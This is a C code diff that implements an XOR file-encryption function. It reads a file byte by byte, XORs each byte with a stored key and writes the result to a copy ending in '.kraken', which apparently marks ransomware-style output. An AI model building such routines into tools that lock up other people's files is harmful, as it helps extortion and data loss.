@@ -90,7 +90,42 @@ static void xor_class_destroy(xor_class_t* this)
 
 static void xor_class_encrypt(xor_class_t* this) 
 {
+    xor_class_variables_t* var = (xor_class_variables_t*)this->impl_;
 
+    open_close_file_class_t* open_close_file_class_obj1 = open_close_file_class_create(var->path);
+    if (open_close_file_class_obj1)
+    {
+        open_close_file_class_obj1->method->ocf_open_file_rb(open_close_file_class_obj1);
+        if ((open_close_file_class_obj1->method->get_var_error_success(open_close_file_class_obj1) == ERROR_SUCCESS))
+        {
+            LONG64 file_size = open_close_file_class_obj1->method->get_var_file_size(open_close_file_class_obj1);
+            FILE* old_file = open_close_file_class_obj1->method->get_var_file(open_close_file_class_obj1);
+
+            _TCHAR newFileName[MAX_PATH + 0x01];
+            _tcscpy_s(newFileName, _countof(newFileName), var->path);
+            _tcscat_s(newFileName, _countof(newFileName), _T(".kraken"));
+
+            open_close_file_class_t* open_close_file_class_obj2 = open_close_file_class_create(newFileName);
+            if (open_close_file_class_obj2)
+            {
+                open_close_file_class_obj2->method->ocf_open_file_wb(open_close_file_class_obj2);
+                if ((open_close_file_class_obj2->method->get_var_error_success(open_close_file_class_obj2) == ERROR_SUCCESS))
+                {
+                    FILE* new_file = open_close_file_class_obj2->method->get_var_file(open_close_file_class_obj2);
+
+                    _TCHAR c_byte = 0x00;
+                    for (LONG64 i = 0x00; i < file_size; i++)
+                    {
+                        fread(&c_byte, 0x01, 0x01, old_file);
+                        c_byte ^= var->key;
+                        fwrite(&c_byte, 0x01, 0x01, new_file);
+                    }
+                }
+                open_close_file_class_obj2->method->ocf_destroy(open_close_file_class_obj2);
+            }
+        }
+        open_close_file_class_obj1->method->ocf_destroy(open_close_file_class_obj1);
+    }
 }
 
 static void xor_class_read_file_key(xor_class_t* this) 
